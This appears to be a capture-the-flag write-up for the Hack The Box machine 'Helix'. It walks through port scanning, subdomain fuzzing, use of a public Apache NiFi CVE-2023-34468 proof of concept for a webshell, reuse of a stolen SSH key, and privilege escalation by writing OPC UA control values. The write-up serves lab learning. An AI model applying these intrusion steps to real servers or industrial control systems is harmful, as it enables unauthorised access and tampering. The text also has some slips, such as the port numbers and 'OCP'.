# Helix-HTB

Network scanning with nmap shows us that there are two open ports, 80 and 22:
└─$ cat nmap_all_ports.txt 
# Nmap 7.98 scan initiated Mon May 11 19:34:35 2026 as: /usr/lib/nmap/nmap -sS -Pn -T4 --min-rate 1000 -p- -oN nmap_all_ports.txt helix.htb
Warning: 10.129.39.129 giving up on port because retransmission cap hit (6).
Nmap scan report for helix.htb (10.129.39.129)
Host is up (0.19s latency).
Not shown: 58724 closed tcp ports (reset), 6809 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Mon May 11 19:38:55 2026 -- 1 IP address (1 host up) scanned in 260.08 seconds


We'll find nothing of interest at the main website, but if we look for subdomains with ffuf we'll find "flow.helix.htb":
└─$ cat ffuf_helix.txt     
flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 60ms]

Going to this address sends us directly to a api for an apache based service called NiFi. NiFi is used for data flow automation:
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/7e42b6e7-a555-425b-8430-bd17e19d419c" />

If we scoop around enough we can find the version being used at the website:
<img width="1277" height="797" alt="image" src="https://github.com/user-attachments/assets/694b7046-7d59-40a6-8a24-6df53959960a" />

If we search online, we can find a PoC for CVE-2023-34468 available https://github.com/mbadanoiu/CVE-2023-34468, download it, execute it and you'll get webshell:
<img width="1000" height="300" alt="image" src="https://github.com/user-attachments/assets/fa2f9c0e-e7ec-4809-8c6b-9063e92e249b" />
<img width="1253" height="375" alt="image" src="https://github.com/user-attachments/assets/0d009185-7a4a-47eb-9861-5adc853c595c" />

There, enumeration finds us a private key for the operator user:
<img width="1062" height="162" alt="image" src="https://github.com/user-attachments/assets/7f78c198-b30d-4bca-a18d-6be49d8e01ac" />

Now, at your machice create a hidden folder called .ssh and inside it create a file named id_rsa:
<img width="1207" height="313" alt="image" src="https://github.com/user-attachments/assets/471ee457-7600-4769-bf11-c379cfb016f4" />

Then reduce it's permissions, like so: 
<img width="582" height="42" alt="image" src="https://github.com/user-attachments/assets/42b471ae-812d-4fff-839b-f75a49c4d534" />

Connect and get user:
<img width="716" height="542" alt="image" src="https://github.com/user-attachments/assets/311c07ff-b7d2-4ae3-9d0e-670d4b3c4710" />

Now for privilege escalation we first check sudo -l:
<img width="1080" height="115" alt="image" src="https://github.com/user-attachments/assets/c78ea1f5-c135-4154-a52e-e6677fa45356" />

And then ss -tulnp for open ports:
<img width="1225" height="218" alt="image" src="https://github.com/user-attachments/assets/734724fd-e647-459e-bb60-499f30e8daca" />

So, 4840 and 8081 are of interest. Port 4840 is  if we foward 8081, we find the following service:
<img width="1907" height="633" alt="image" src="https://github.com/user-attachments/assets/17ae4dc9-ceef-4097-83d1-4d88d1549499" />

This seems to be a monitor for some kind of IoT service, we can see that there is a control module inside opc.tcp://127.0.0.1:4048/helix/
<img width="578" height="233" alt="image" src="https://github.com/user-attachments/assets/a3b43340-af43-4809-94eb-f69de3a2f7b6" />

4840 is the port commonly used for OCP. OCP is a protocol used for communications between IoT sensors and cloud processors. The line of attack here is to try and modify the parameters found in 8081 so we can open a maintenance terminal using the command presented to us when we executed sudo -l. The command is: /usr/local/sbin/helix-maint-console. If we try to execute it before tampering with the settings, the following message shows:
<img width="1113" height="222" alt="image" src="https://github.com/user-attachments/assets/f60a5181-8214-4472-b1de-40a7503806d7" />

The key to priv esc here is making sure that Mode is set to MAINTENANCE, Override is set to True and CalibrationOffset is Doubled. To do so we'll use opc ua commands:
uawrite -u opc.tcp://127.0.0.1:4840/helix/ \            
  -n "ns=2;i=12" \
  -t string \
  MAINTENANCE

uawrite -u opc.tcp://127.0.0.1:4840/helix/ \
  -n "ns=2;i=13" \
  -t bool \
  True

uawrite -u opc.tcp://127.0.0.1:4840/helix/ \
  -n "ns=2;i=6" \
  -t double \
  12.0

Like so:
<img width="910" height="552" alt="image" src="https://github.com/user-attachments/assets/e79aa479-fdad-4eb9-b39c-9a5a349f2383" />


Now execute the command and get root:
<img width="1427" height="82" alt="image" src="https://github.com/user-attachments/assets/1db4f187-f5f2-4653-a526-ec3bbb14a9ad" />















